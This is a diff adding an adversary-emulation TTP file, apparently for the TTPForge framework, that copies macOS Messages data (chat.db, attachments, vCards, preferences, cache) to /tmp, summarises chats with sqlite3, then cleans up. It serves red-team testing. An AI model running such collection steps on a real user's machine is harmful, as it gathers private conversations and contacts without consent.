@@ -1,0 +1,105 @@
+id: 2c8b4a3d-7g9h-1i2j-3k4l-5m6n7o8p9q0r
+api_version: 2.0
+metadata:
+  name: Extract Messages Database
+  description: Extract and collect data from the macOS Messages application
+  author: TTPForge
+  created: 2026-01-30
+  updated: 2026-01-30
+  tags:
+    - collection
+    - messages
+    - imessage
+    - chat-history
+  
+requirements:
+  platforms:
+    - os: darwin
+  
+args:
+  output_path:
+    description: Output path for Messages data
+    type: string
+    default: "/tmp/messages_data"
+  
+  extract_attachments:
+    description: Extract message attachments
+    type: boolean
+    default: true
+
+steps:
+  - name: Create output directory
+    command: mkdir -p {{ output_path }}
+
+  - name: Extract Messages database
+    command: |
+      messages_db="~/Library/Messages/chat.db"
+      if [ -f "$messages_db" ]; then
+        cp "$messages_db" "{{ output_path }}/chat.db" 2>/dev/null || true
+      fi
+
+  - name: Extract Contacts and vCard data
+    command: |
+      find ~/Library/Messages -name "*.vcf" -o -name "*.vcard" 2>/dev/null | xargs -I {} cp {} {{ output_path }}/ 2>/dev/null || true
+
+  - name: Collect message attachments
+    command: |
+      attachments_path="~/Library/Messages/Transfers"
+      if [ -d "$attachments_path" ]; then
+        mkdir -p {{ output_path }}/attachments
+        cp -r "$attachments_path" "{{ output_path }}/attachments/" 2>/dev/null || true
+      fi
+
+  - name: Query Messages database
+    command: |
+      if [ -f "{{ output_path }}/chat.db" ]; then
+        sqlite3 "{{ output_path }}/chat.db" \
+          "SELECT COUNT(*) as message_count FROM message;" 2>/dev/null > {{ output_path }}/message_count.txt || true
+        sqlite3 "{{ output_path }}/chat.db" \
+          "SELECT chat_id, COUNT(*) as count FROM message GROUP BY chat_id ORDER BY count DESC LIMIT 10;" 2>/dev/null > {{ output_path }}/chat_summary.txt || true
+      fi
+
+  - name: Collect iMessage preferences
+    command: |
+      find ~/Library/Preferences -name "*messages*" -o -name "*imessage*" 2>/dev/null | xargs -I {} cp {} {{ output_path }}/ 2>/dev/null || true
+
+  - name: Extract message cache
+    command: |
+      cache_path="~/Library/Caches/com.apple.Messages"
+      if [ -d "$cache_path" ]; then
+        cp -r "$cache_path" "{{ output_path }}/message_cache" 2>/dev/null || true
+      fi
+
+checks:
+  - name: Verify output directory
+    command: test -d {{ output_path }} && echo "Messages output directory created"
+    expected_output: "Messages output directory created"
+
+  - name: Check for database file
+    command: |
+      if [ -f {{ output_path }}/chat.db ]; then
+        size=$(du -h {{ output_path }}/chat.db | cut -f1)
+        echo "Chat database size: $size"
+      else
+        echo "No chat database found"
+      fi
+
+  - name: Verify extracted data
+    command: |
+      count=$(find {{ output_path }} -type f 2>/dev/null | wc -l)
+      echo "Extracted $count files"
+
+tests:
+  - name: default
+    description: Default test with dry run
+    dry_run: true
+    steps:
+      - name: Verify Messages app
+        command: test -d /Applications/Messages.app && echo "Messages app installed"
+
+cleanup:
+  - name: Remove Messages data
+    command: rm -rf {{ output_path }}
+
+  - name: Verify cleanup
+    command: test ! -d {{ output_path }} && echo "Messages data cleanup completed"
